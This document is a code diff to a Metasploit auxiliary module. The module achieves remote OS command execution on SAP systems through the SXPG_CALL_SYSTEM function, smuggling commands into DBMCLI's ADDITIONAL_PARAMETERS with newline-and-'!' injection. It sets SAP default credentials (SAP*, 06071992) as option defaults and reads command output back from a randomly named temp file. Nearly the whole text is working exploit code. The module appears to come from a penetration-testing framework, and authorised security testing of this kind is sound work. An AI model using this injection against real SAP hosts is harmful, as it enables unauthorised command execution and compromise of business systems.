@@ -25,12 +25,9 @@ class Metasploit4 < Msf::Auxiliary
         This module makes use of the SXPG_CALL_SYSTEM Remote Function Call to execute OS commands as configured in SM69.
         The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
       },
-      'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
+      'References' => [[ 'URL', 'https://labs.mwrinfosecurity.com/blog/2012/09/03/sap-parameter-injection/' ]],
       'Author' => [ 'nmonkee' ],
       'License' => BSD_LICENSE,
-      'DefaultOptions' => {
-        'CLIENT' => "000"
-      }
     )
 
     register_options(
@@ -38,74 +35,80 @@ class Metasploit4 < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'Username', 'SAP*']),
         OptString.new('PASSWORD', [true, 'Password', '06071992']),
         OptString.new('CMD', [true, 'Command', 'id']),
-        OptEnum.new('OS', [true, 'Windows NT/UNIX', "UNIX", ['UNIX','Windows NT']]),
+        OptEnum.new('OS', [true, 'Target OS','UNIX',['UNIX', 'Windows NT']])
       ], self.class)
   end
 
   def run_host(rhost)
     user = datastore['USERNAME']
-    pass = datastore['PASSWORD']
+    password = datastore['PASSWORD']
     unless datastore['CLIENT'] =~ /^\d{3}\z/
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
 
-    os = "ANYOS"
+    @outfile = Rex::Text.rand_text_alpha(8)
+
     command = create_payload(1)
-    res = exec_CMD(user,datastore['CLIENT'],pass,rhost,datastore['rport'],command,os)
+    res = exec_CMD(user, datastore['CLIENT'], password, rhost, rport, command)
+
     if res =~ /External program terminated with exit code/im
       print_error("#{rhost}:#{rport} [SAP] DBMCLI does not exist on target host")
       return
     end
+
+
     command = create_payload(2)
-    res = exec_CMD(user,datastore['CLIENT'],pass,rhost,rport,command,os)
-    print res if res
+    res = exec_CMD(user, datastore['CLIENT'], password, rhost, rport, command)
+
+    if res
+      print res
+    else
+      print_error("#{rhost}:#{rport} [SAP] No output received")
+    end
   end
 
   def create_payload(num)
     command = ""
 
+    target_host = Rex::Text.rand_text_alpha(5)
+
     if datastore['OS'].downcase == "unix"
       if num == 1
-        command = "-o /tmp/pwned.txt -n pwnie" + "\n!"
-        command << datastore['CMD'].gsub(" ","\t")
+        command = "-o /tmp/#{@outfile} -n pwnie\n!" #"#{target_host}\n!"
+        command << datastore['CMD'].gsub(' ',"\t")
         command << "\n"
       else
-        command = "-ic /tmp/pwned.txt"
+        command = "-ic /tmp/#{@outfile}"
       end
     elsif datastore['OS'].downcase == "windows nt"
       if num == 1
-        command = '-o c:\\pwn.out -n pwnsap' + "\r\n!"
+        command = "-o c:\\#{@outfile} -n #{target_host}\r\n!"
         space = "%programfiles:~10,1%"
         command << datastore['COMMAND'].gsub(" ",space)
         # TODO The command should be gsubbed for space?
       else
-        command = '-ic c:\\pwn.out'
+        command = "-ic c:\\#{@outfile}"
       end
     end
 
     command
   end
 
-  def exec_CMD(user,client,pass,rhost,rport,command,os)
+  def exec_CMD(user,client,pass,rhost,rport,command)
+    return nil if command.blank?
+
     login(rhost, rport, client, user, pass) do |conn|
       conn.connection_info
 
       begin
-        data  = sxpg_command_execute(conn,
-                  {
-                    :COMMANDNAME => 'DBMCLI',
-                    :OPERATINGSYSTEM => os,
-                    :ADDITIONAL_PARAMETERS => command
-                  })
-
-        #if data =~ /E[rR][rR]/ || data =~ /---/ || data =~ /for database \(/
-          #nothing
-        #elsif data =~ /unknown host/ || data =~ /\(see/ || data =~ /returned with/
-          #nothing
-        #else
-        #  result << data
-        #end
-
+        data  = sxpg_command_execute(
+          conn,
+          {
+            :COMMANDNAME => 'DBMCLI',
+            :OPERATINGSYSTEM => 'ANYOS',
+            :ADDITIONAL_PARAMETERS => command
+          })
+        puts data
         return data
       rescue NWError => e
         print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
